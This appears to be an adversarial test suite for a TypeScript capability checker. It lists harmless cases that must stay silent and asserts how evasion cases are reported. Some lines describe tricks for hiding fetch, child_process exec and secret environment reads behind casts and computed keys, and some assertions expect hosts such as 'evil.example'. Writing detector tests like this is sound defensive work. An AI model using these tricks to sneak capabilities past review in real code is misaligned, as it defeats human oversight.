  en_fp01_require_pure: "export function t() { const p = require(\"path\"); return p.join(\"a\", \"b\"); }",
  en_fp02_import_const_pure: "const spec = \"node:path\";\nexport async function t() { return (await import(spec)).join(\"a\", \"b\"); }",
  en_fp03_stylesheet: "import \"./missing-styles.css\";\nimport \"./missing-styles.css?inline\";\nexport const x = 1;",
  en_fp04_node_url: "export function t() { return new URL(\"data:text/plain,hello\").href; }",
  // A class with a same-named member that can't stand in for the interface isn't an implementation.
  // (All cases share one project, so these use member names no other case has.)
  en_fp05_unrelated_same_name: "interface Pager { page(oncall: string): Promise<unknown> }\nclass Beeper { page(level: number) { return fetch(\"https://beeper.example/\" + level); } }\nexport function t(p: Pager, who: string) { return p.page(who); }\nexport const b = Beeper;",
  // A call on one particular object reaches that object's method, not every look-alike.
  en_fp07_object_method: "const relay = { forward(u: string) { return u.length; } };\nconst courier = { forward(u: string) { void fetch(u); return u.length; } };\nexport function t(u: string) { return relay.forward(u); }\nexport const c = courier;",
  // Objects of functions that are created but not handed to anything, or hold no functions.
  en_fp08_local_object: "/** @perm env(MODE) */\nexport function t() { const local = { run: () => fetch(\"https://x.example/\") }; void local; return process.env.MODE; }",
  en_fp09_data_object_passed: "declare function report(o: object): void;\n/** @perm env(MODE) */\nexport function t() { report({ level: \"info\", mode: process.env.MODE }); }",
  en_fp10_harmless_decorator: "function sealed(c: unknown, _ctx: ClassDecoratorContext) { Object.seal(c); }\n@sealed class C {}\nexport { C };",
  // Copying an object runs its getters, not its methods; arithmetic on numbers and dates runs no project code.
  en_fp11_spread_methods: "const o = { a: 1, run() { return fetch(\"https://x.example/\"); } };\nexport function t() { return { ...o }; }",
  en_fp12_arithmetic: "export function t(a: number, b: Date, c: Date) { return a * 2 + +(b < c) - (b.valueOf() % 7); }",
  // `!` converts to a boolean without calling anything; a namespace that isn't exported is private.
  en_fp13_logical_not: "const o = { valueOf() { void fetch(\"https://x.example/\"); return 1; } };\nexport function t() { return !o; }",
  en_fp14_private_namespace: "namespace Hidden { export function run() { return fetch(\"https://x.example/\"); } }\nexport const n = 1;\nvoid Hidden;",
  en_fp15_extends_library_class: "import { EventEmitter } from \"node:events\";\nexport class Bus extends EventEmitter {}\nexport function t() { return new Bus(); }",
  en_fp06_missing_members: "interface Uplink { transmit(u: string): void; hangUp(): void }\nconst partial = { transmit(u: string) { void fetch(u); } };\nexport function t(l: Uplink, u: string) { l.transmit(u); return partial; }",
  // Capability functions and classes mentioned without being called or passed on.
  fp16_instanceof: "export function t(x: unknown) { return x instanceof WebSocket; }",
  fp17_feature_detection: "export function t() { if (globalThis.fetch && !globalThis.WebSocket) return 1; return typeof EventSource === \"undefined\" ? 2 : 3; }",
  fp18_class_constant: "export function t() { return WebSocket.OPEN + XMLHttpRequest.DONE; }",
  fp19_timer_callbacks: "import { promisify } from \"node:util\";\nexport const sleep = promisify(setTimeout);\nexport function t() { window.setTimeout(() => {}, 10); setTimeout.call(null, () => {}, 0); }",
  fp20_web_classes: "export function t() { return new Headers({ a: \"b\" }).get(\"a\") ?? new URL(\"/x\", \"https://good.example\").href; }",
  fp28_timer_apply_callback: "export function t() { setTimeout.apply(null, [() => {}, 10]); }",
  // Classes with no constructor of their own, passed as values (dependency injection lists, say).
  fp30_class_values: "class Plain { x = 1; }\nclass Child extends Plain {}\nexport const providers = [Plain, Child];\nexport function t() { return Reflect.construct(Plain, []); }",
  // Helpers for i23 and fp33: a module of the project's that re-exports a capability module under a
  // name, and one that exports nothing that reaches anything.
  fp31_nested_barrel: "export const VERSION = \"1\";\nexport * as cp from \"node:child_process\";",
  fp32_harmless_lib: "export const NAME = \"x\";\nexport function format(n: number) { return n.toFixed(2); }",
  fp33_harmless_lib_any: "import * as lib from \"./fp32_harmless_lib.js\";\nexport function t() { const m: any = lib; return m.format(1); }",
  fp34_module_constant_cast: "import fs from \"node:fs\";\nexport function t() { return (fs as any).constants.F_OK; }",
  fp35_binding_lookalikes: "export function t(el: { binding: string }) { const process = { binding: () => 1 }; return [el.binding, process.binding()]; }",
  fp36_alias_cycle: "const a: () => void = b;\nconst b: () => void = a;\nexport function t() { return [a]; }",
  fp37_reflect_get_plain: "export function t(k: string) { const config = { a: 1 }; return Reflect.get(config, k).toFixed(0); }",
  fp38_feature_detection_nested: "export function t() {\n  if (typeof window !== \"undefined\" && (window.WebSocket || window.EventSource)) return 1;\n  if (!(globalThis.fetch && globalThis.WebSocket)) return 2;\n  return 3;\n}",
  fp21_comparison: "export function t(f: unknown) { return f === fetch || f !== WebSocket; }",
  // A barrel re-exporting a capability module touches nothing by itself (i05 casts it).
  fp22_barrel: "export * from \"node:child_process\";",
  fp23_enumerate_plain: "import * as path from \"node:path\";\nexport function t() { return Object.values({ a: 1 }).length + Object.keys(path).length; }",
  fp24_pure_module_unknown: "import * as path from \"node:path\";\nfunction use(m: unknown) { return m; }\nexport function t() { return use(path); }",
  fp25_reflect_get_reads: "export function t(k: string) { return [Reflect.get(globalThis, \"__APP__\"), Reflect.get(window, k)]; }",
  fp26_module_constant: "import * as fs from \"node:fs\";\nexport function t() { return fs.constants.F_OK; }",
  fp27_then_any_harmless: "export function t() { return Promise.resolve(1).then((n: any) => n + 1); }",
};

const knownMisses: Record<string, { why: string; code: string }> = {
  c10_global_alias_any: { why: "a global stored as any, then a capability called through it (left silent: `const w = window as any` is common and harmless)", code: "export async function t(u: string) { const w = window as any; return w.fetch(u); }" },
};

const typeRoots = [fileURLToPath(new URL("../node_modules/@types", import.meta.url))];

let dir: string;
let report: Report;

beforeAll(() => {
  dir = mkdtempSync(path.join(tmpdir(), "permlang-adversarial-"));
  writeFileSync(path.join(dir, "tsconfig.json"), JSON.stringify({
    compilerOptions: { target: "ES2022", module: "NodeNext", moduleResolution: "NodeNext", strict: true, lib: ["ES2022", "DOM"], types: ["node"], typeRoots },
    include: ["*.ts"],
  }));
  for (const [name, code] of Object.entries({ ...caught, ...silent, ...Object.fromEntries(Object.entries(knownMisses).map(([n, m]) => [n, m.code])) })) {
    writeFileSync(path.join(dir, `${name}.ts`), code + "\n");
  }
  report = checkTsConfig(path.join(dir, "tsconfig.json"), { strictness: "development" });
}, 120_000);

// Windows can hold the folder open for a while after the check (a virus scanner, say). A
// temporary folder left behind is harmless, so cleaning up mustn't fail the run.
afterAll(() => removeTemporary(dir));

const errorsIn = (name: string) =>
  report.diagnostics.filter((d) => d.severity === "error" && path.basename(d.file) === `${name}.ts`);

describe("caught", () => {
  for (const name of Object.keys(caught)) it(name, () => expect(errorsIn(name).length).toBeGreaterThan(0));
});

// A named member read through a cast is reported once, as the access it is, not also as hidden.
describe("reported as the access it is", () => {
  const capabilities = (name: string) => errorsIn(name).map((d) => d.capability);
  it("a21_namespace_bracket", () => expect(capabilities("a21_namespace_bracket")).toEqual(["exec"]));
  it("c06_process_env_any", () => expect(capabilities("c06_process_env_any")).toEqual(["env(SECRET)"]));
  it("a31_window_self", () => expect(capabilities("a31_window_self")).toEqual(["net"]));
  // new URL(path, base) with literal parts names its host.
  it("a22_new_url", () => expect(capabilities("a22_new_url")).toEqual(["net(evil.example)"]));
  // Read past a cast, named in the message as written.
  it("e05_any_member_as_value", () => expect(errorsIn("e05_any_member_as_value").map((d) => d.call)).toEqual(["(globalThis as any).fetch as a value"]));
  // .call and .apply with a literal list are calls with arguments; a member chain past a cast is followed.
  it("h01_beacon_call", () => expect(capabilities("h01_beacon_call")).toEqual(["net(evil.example)"]));
  it("i09_globalthis_process_env", () => expect(capabilities("i09_globalthis_process_env")).toEqual(["env(SECRET)"]));
  // A module given to a parameter of its own type, or through a promise, is checked through it.
  it("j03_typed_injection", () => expect(capabilities("j03_typed_injection")).toEqual(["exec"]));
  it("j04_promise_of_module", () => expect(capabilities("j04_promise_of_module")).toEqual(["exec"]));
  it("j05_main_module_typed", () => expect(capabilities("j05_main_module_typed")).toEqual(["unverifiable"]));
  // A module given to a library function as its `this` isn't an escape; the function itself is still a value.
  it("j06_library_this", () => expect(capabilities("j06_library_this")).toEqual(["fs.read", "fs.write"]));
  // Options that may be undefined could still replace the URL's host (this suite is strict about null).
  it("h09_options_maybe", () => expect(capabilities("h09_options_maybe")).toEqual(["net"]));
  it("i25_main_module_chain", () => expect(capabilities("i25_main_module_chain")).toEqual(["unverifiable"]));
  it("i24_reflect_get_member", () => expect(errorsIn("i24_reflect_get_member").map((d) => d.call)).toEqual(['Reflect.get(process, "e" + "nv") read with a computed key']));
  // Long code is shortened in the message.
  it("i31_long_reflect_get", () => expect(errorsIn("i31_long_reflect_get").map((d) => d.call)).toEqual(['Reflect.get(await import("node:child_process"), process.argv[2] ?? ... read with a computed key']));
});

describe("silent", () => {
  for (const name of Object.keys(silent)) {
    it(name, () => expect(report.diagnostics.filter((d) => path.basename(d.file) === `${name}.ts`)).toEqual([]));
  }
});

describe("known misses (move to caught once fixed)", () => {
  for (const [name, { why }] of Object.entries(knownMisses)) it(`${name}: ${why}`, () => expect(errorsIn(name)).toEqual([]));
});
